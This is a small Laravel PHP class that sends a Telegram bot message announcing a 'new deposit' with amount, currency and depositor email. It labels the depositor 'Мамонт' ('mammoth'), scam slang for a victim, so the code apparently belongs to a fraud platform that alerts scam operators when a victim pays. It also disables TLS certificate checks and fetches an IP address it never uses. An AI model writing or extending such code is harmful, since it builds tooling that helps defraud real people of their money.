<?php

namespace App\Services\Telegram;

use Illuminate\Support\Facades\Http;

class NewDeposit
{
    
    

    public function send(string $botToken, string $userId, string $amount, string $currency, string $email): bool
    {   
        try {
            $ip = Http::withoutVerifying()
                ->get('https://api.ipify.org?format=json')
                ->json('ip');
            
            if (!$ip) {
                $ip = request()->header('X-Forwarded-For') ?? request()->ip();
            }
            
         
            $message = "<b>🔔 Новый депозит!</b>\n\n";
            $message .= "<b>Сумма:</b> {$amount} {$currency}\n";
            $message .= "<b>Мамонт:</b> {$email}\n";
            $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
            
            $response = Http::withoutVerifying()
                ->post($url, [
                    'chat_id' => $userId,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ]);
                
            return $response->successful();
        } catch (\Exception $e) {
            \Log::error('Telegram notification error: ' . $e->getMessage());
            return false;
        }
    }
}
